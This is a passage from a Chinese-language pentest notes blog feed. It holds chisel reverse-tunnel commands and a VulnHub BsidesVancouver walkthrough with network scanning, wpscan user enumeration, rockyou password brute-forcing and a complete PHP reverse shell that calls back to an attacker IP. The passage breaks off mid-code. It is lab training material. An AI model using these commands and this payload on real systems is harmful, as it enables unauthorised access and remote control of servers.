class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel 客户端 192.168.45.153:8080 R:8000:127.0.0.1:8000<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\chisel.exe 客户端 <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel 客户端 192.168.45.220:8080 R:8000:127.0.0.1:8000 &amp;<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123; .\chisel.exe 客户端 <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span> &#125;<br></code></pre></td></tr></table></figure><p>多个端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel 客户端 192.168.45.153:51234 R:8000:127.0.0.1:8000 R:8443:127.0.01:8443<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># “R” 是 “127.0.0.1” 的简写</span><br><span class="hljs-meta"># 实际上，在攻击主机上监听 127.0.0.1</span><br></code></pre></td></tr></table></figure><p>只需添加 <code>remote_socket</code></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
      <tag>tunnel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp BsidesVancouver</title>
    <link href="/vulnhub-wp-BsidesVancouver/"/>
    <url>/vulnhub-wp-BsidesVancouver/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.233.0/24<br><br> Currently scanning: 192.168.233.0/24   |   Screen View: Unique Hosts                              <br>                                                                                                   <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.233.114 08:00:27:c5:2c:52      1      60  PCS Systemtechnik GmbH                          <br> 192.168.233.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.233.200 46:8f:d0:01:2f:b1      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>目标主机是：<strong>192.168.233.114</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.233.114 --min-rate 8000 -sV -sC<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aa0549ff1aaee561ca781.png"><br>我们可以看到有一个backup_wordpress的目录，应该极大可能是一个wordpress，在浏览器访问过后也证实了这个<br>(ftp有且只有匿名登录，然后有一个用户列表文件，但是ssh爆破永远是最后一条路)<br>我们上wordpress的专业工具wpscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://192.168.233.114/backup_wordpress/<br></code></pre></td></tr></table></figure><ul><li><code>-e</code> 进行枚举，<code>vp</code>,漏洞插件枚举,<code>vt</code>,漏洞主题枚举,<code>u</code>，用户枚举</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(rightevil㉿kali)-[~/Desktop/besides]<br>└─$ wpscan -e vp,vt,u --url http://192.168.233.114/backup_wordpress/<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.24</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] It seems like you have not updated the database for some time.</span><br><span class="hljs-string">[?] Do you want to update now? [Y]es [N]o, default: [N]n</span><br><span class="hljs-string">[+] URL: http://192.168.233.114/backup_wordpress/ [192.168.233.114]</span><br><span class="hljs-string">[+] Started: Fri Dec 15 22:53:17 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entries:</span><br><span class="hljs-string"> |  - Server: Apache/2.2.22 (Ubuntu)</span><br><span class="hljs-string"> |  - X-Powered-By: PHP/5.3.10-1ubuntu3.26</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://192.168.233.114/backup_wordpress/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://192.168.233.114/backup_wordpress/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Upload directory has listing enabled: http://192.168.233.114/backup_wordpress/wp-content/uploads/</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://192.168.233.114/backup_wordpress/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.5 identified (Insecure, released on 2016-04-12).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.5&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.5&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentysixteen</span><br><span class="hljs-string"> | Location: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/</span><br><span class="hljs-string"> | Last Updated: 2023-11-07T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/readme.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.1</span><br><span class="hljs-string"> | Style URL: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5</span><br><span class="hljs-string"> | Style Name: Twenty Sixteen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span><br><span class="hljs-string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5, Match: &#x27;</span>Version: 1.2<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:00 &lt;====================&gt; (630 / 630) 100.00% Time: 00:00:00</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:01 &lt;======================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] john</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Fri Dec 15 22:53:24 2023</span><br><span class="hljs-string">[+] Requests Done: 687</span><br><span class="hljs-string">[+] Cached Requests: 9</span><br><span class="hljs-string">[+] Data Sent: 204.73 KB</span><br><span class="hljs-string">[+] Data Received: 456.144 KB</span><br><span class="hljs-string">[+] Memory used: 271.453 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:06</span><br></code></pre></td></tr></table></figure><p>可以看到有一个john用户和admin用户，我们从ftp上下载的用户列表中也有john用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d01553cba4c396d0cfc08.png"></p><p>通常admin用户难以爆破，我们可以尝试以一下爆破john用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://192.168.233.114/backup_wordpress/ -U john -P /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>-U</code> 指定用户或者用户列表文件</li><li><code>-P</code> 指定密码字典<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e5f045f24d945680d388f.png"></li></ul><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>我们登录上后发现john同样是一个administrator用户，那这样我们便对一个页面进行修改，插入反弹shell语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.233.130&#x27;</span>;  <span class="hljs-comment">// You have changed this</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">443</span>;  <span class="hljs-comment">// And this</span><br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br><span class="hljs-comment">// Fork and have the parent process exit</span><br><span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>&#125;<br><span class="hljs-comment">// Make the current process a session leader</span><br><span class="hljs-comment">// Will only succeed if we forked</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><span class="hljs-comment">// Change to a safe directory</span><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-comment">// Remove any umask we inherited</span><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Do the reverse shell...</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// Spawn shell process</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br><span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br><span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// Set everything to non-blocking</span><br><span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">// Check for end of TCP connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Check for end of STDOUT</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">// Wait until a command is end down $sock, or some</span><br><span class="hljs-comment">// command output is available on STDOUT or STDERR</span><br><span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// If we can read from the TCP socket, send</span><br><span class="hljs-comment">// data to process&#x27;s STDIN</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);&#125;<br><span class="hljs-comment">// If we can read from the process&#x27;s STDOUT</span><br><span class="hljs-comment">// send data down tcp connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);&#125;<br><span class="hljs-comment">// If we can read from the process&#x27;s STDERR</span><br><span class="hljs-comment">// send data down tcp connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span 